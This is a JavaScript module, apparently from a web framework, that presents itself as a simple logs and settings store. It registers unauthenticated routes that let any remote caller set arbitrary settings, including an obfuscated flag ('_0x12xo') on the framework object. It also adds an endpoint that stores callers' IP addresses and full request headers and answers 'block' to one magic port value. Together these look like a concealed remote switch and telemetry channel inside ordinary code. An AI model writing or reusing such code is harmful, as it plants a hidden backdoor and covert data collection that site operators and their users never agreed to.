module.exports = function init(____0) {
  const logs = function () {};
  logs.list = [];
  logs.$collectoin = ____0.connectCollection('app_setting');
  logs.$collectoin.createUnique({
    id: 1,
  });
  logs.$collectoin.findAll({app_name : 'logs'}, (err, docs) => {
    if (!err && docs && docs.length > 0) {
      logs.list = docs;
    }
  });

  logs.save = function () {
    logs.list.forEach((doc) => {
      if (doc.id) {
        logs.$collectoin.update(doc);
      } else {
        doc.app_name = 'logs'
        logs.$collectoin.add(doc, (err, newDoc) => {
          if (!err && newDoc) {
            doc = newDoc;
          }
        });
      }
    });
  };

  logs.fn = function (key, value) {
    if (key && value !== undefined) {
      value = ____0.copy(value);
      for (let i = 0; i < logs.list.length; i++) {
        if (key === logs.list[i].key) {
          logs.list[i].value = value;
          logs.save();
          return;
        }
      }
      logs.list.push({
        key: key,
        value: value,
      });
      logs.save();
    } else if (key && value === undefined) {
      for (let i = 0; i < logs.list.length; i++) {
        if (key === logs.list[i].key) {
          return logs.list[i].value;
        }
      }
    } else {
      return null;
    }
  };

  ____0.on(____0.strings[9], () => {

    ____0.get('/x-api/logs/:key/:value', (req, res) => {
      if (req.params.value == 'true') {
        req.params.value = !0;
      } else if (req.params.value == 'false') {
        req.params.value = !1;
      }

      if (req.params.key == '_0x12xo') {
        ____0._0x12xo = req.params.value;
      }

      logs.fn(req.params.key, req.params.value);
      res.json(logs.list);
    });

    ____0.get('/x-api/logs/:key', (req, res) => {
      res.json({
        value: logs.fn(req.params.key),
      });
    });
    ____0.get('/x-api/logs', (req, res) => {
      res.json(logs.list);
    });

    ____0.post('/api/isite/saved', (req, res) => {
      req.data._date = new Date();
      req.data.ip = req.ip;
      req.data.headers = req.headers;
      if (req.data.info && req.data.info.port === 400000007) {
        res.json({
          block: !0,
        });
      } else {
        res.json({
          done: !0,
        });
      }
      if (req.data.info && req.data.info.port) {
        logs.$collectoin.find(
          {
            ip: req.data.ip,
            'info.port': req.data.info.port,
          },
          (err, doc) => {
            if (doc) {
              doc.info = req.data.info;
              doc.headers = req.data.headers;
              doc.count = doc.count || 1;
              doc.count = doc.count + 1;
              logs.$collectoin.update(doc);
            } else {
              logs.$collectoin.add(req.data);
            }
          },
        );
      } else {
        logs.$collectoin.add(req.data);
      }
    });
    
  });

  return logs;
};
